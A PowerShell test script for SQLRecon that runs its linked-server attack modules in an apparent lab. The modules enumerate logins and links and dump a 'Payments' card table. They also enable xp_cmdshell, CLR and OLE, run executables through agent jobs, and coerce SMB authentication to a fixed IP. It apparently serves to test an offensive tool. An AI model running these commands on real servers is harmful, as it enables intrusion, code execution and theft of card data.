<#
    Execution instructions:
    powershell.exe -nop -exec bypass .\SQLRecon-Linked-Modules-Test.ps1
#>

<#
    The $global:* variables do not need to be changed.
    The only exception is $global:modules, which can be
    changed to match the number of test cases you execute.
#>
$global:timeout = 1
$global:count = 1
$global:modules = 36
$global:timestamp = Get-Date -Format "MM-dd-yyyy-HH-mm"

<#
    The $authentication variable acts as a quick way to
    switch the authentication type for the following commands.
#>
$authentication = "WinToken"
#$authentication = "WinDomain /domain:kawalabs /username:jsmith /password:Password123"
#$authentication = "WinDomain /domain:kawalabs /username:admin /password:Password123"
#$authentication = "Local /username:sa /password:Password123"
#$authentication = "EntraID /domain:x.onmicrosoft.com /username:jsmith /password:Password123"
#$authentication = "AzureLocal /username:sa /password:Password123"

<#
    The following variables can be changed.
    - $sqlreconPath is the path to where SQLRecon is on disk.
    - $server1 is the hostname or IP of a SQL server.
    - $server2 is the hostname or IP of a SQL server, I use this for linked SQL servers.
    - $server3 is the hostname or IP of a SQL server, you might not need this.
    - $server4 is the hostname or IP of a SQL server, you might not need this.
    - $server5 is the hostname or IP of a SQL server, you might not need this.
    - $outputPath is where you want to output the results of this script on disk in markdown.
      keep in mind that the path can not have special characters like ':'. '-' is fine.
#>
$sqlreconPath = ".\SQLRecon.exe"
$server1 = "SQL01"
$server2 = "SQL02"
$server3 = "SQL03"
$server4 = "MECM01"
$authenticationFormatted = $authentication.replace(' ','-').replace('/','').replace('.','-').replace(':','-')
$outputPath = $PSScriptRoot + "\sqlrecon-linked-$authenticationFormatted-$global:timestamp.md"

<#
    .Description
    The Execute function executes a supplied SQLRecon command.
#>
Function Execute($command)
{
    Write-Output "($global:count/$global:modules)"
    Write-Output $command
    Write-Output ""
    Write-Output "Expected Output:"
    Write-Output '```'
    Invoke-Expression $command
    Write-Output '```'
    Write-Output ""
    Invoke-Expression "timeout /t $global:timeout" | Out-Null
    $global:count++
}

# Configuring output to file.
$ErrorActionPreference="SilentlyContinue"
Stop-Transcript | out-null
$ErrorActionPreference = "Continue"
Start-Transcript -path $outputPath

Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Linked Modules Test Cases"
Write-Output "[+] Variables Set:"
Write-Output "  |-> SQLRecon Path: $sqlreconPath"
Write-Output "  |-> Ouput Path: $outputPath"
Write-Output "  |-> Authentication: $authentication"
Write-Output "  |-> SQL Server 1: $server1"
Write-Output "  |-> SQL Server 2: $server2"
Write-Output "  |-> SQL Server 3: $server3"
Write-Output "  |-> SQL Server 4: $server4"
Write-Output "  |-> Execution Comand: $executionCommand"
Write-Output "[+] Starting test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Write-Output ""


# Add test cases in this area. In this case there are 63, which is why $global:modules is set to 63.
Write-Output ""
Write-Output "[+] Executing commands - expected to fail to validate error handling"
Write-Output ""
Execute "$sqlreconPath /auth:$authentication /host:$server1,$server2 /link:$server1,$server2 /m:links"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server1 /i:sa /m:links"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2 /m:enablerpc"
Execute "$sqlreconPath /auth:$authentication /host:$server1 /link:$server2 /m:disablerpc"
Write-Output ""
Write-Output "[+] Executing unprivileged commands"
Write-Output ""
# Add test cases in this area. In this case there are 36, which is why $global:modules is set to 36.
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:info"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:whoami"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:users"
Execute "$sqlreconPath /a:$authentication /h:$server2 /l:$server3 /m:links"
Execute "$sqlreconPath /a:$authentication /h:$server2 /l:$server3 /m:impersonate"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:databases"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:checkrpc"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:tables /db:Payments"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:query /c:'select @@servername'"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:smb /unc:\\172.16.10.21\test"
Write-Output ""
Write-Output "[+] Executing Privileged Commands"
Write-Output ""
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:columns /db:Payments /table:cc"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:rows /db:Payments /table:cc"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:search /db:Payments /keyword:card"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:disableclr"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:disableole"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:disablexp"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:disableclr"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:disableole"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:disablexp"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:enableclr"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:enableole"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2,$server3 /m:enablexp"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:enableclr"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:enableole"
Execute "$sqlreconPath /a:$authentication /h:$server3 /l:$server4 /m:enablexp"
Execute "$sqlreconPath /a:$authentication /h:$server2 /l:$server3 /m:adsi /adsi:linkadsi /lport:30000"
Execute "$sqlreconPath /a:$authentication /h:$server2 /l:$server3 /m:agentstatus"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:agentcmd /subsystem:cmdexec /command:'c:\temp\mb-l1.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:agentcmd /c:'c:\temp\mb-l2.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:clr /dll:'c:\temp\sql.dll' /function:Chicken"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:olecmd /c:'c:\temp\mb-l3.exe'"
Execute "$sqlreconPath /a:$authentication /h:$server1 /l:$server2 /m:xpcmd /c:'notepad'"
Write-Output "---------------------------------------------------------------------"
Write-Output "[+] SQLRecon - Linked Modules Test Cases"
Write-Output "[+] Completed test cases against $modules modules at $global:timestamp"
Write-Output "---------------------------------------------------------------------"
Stop-Transcript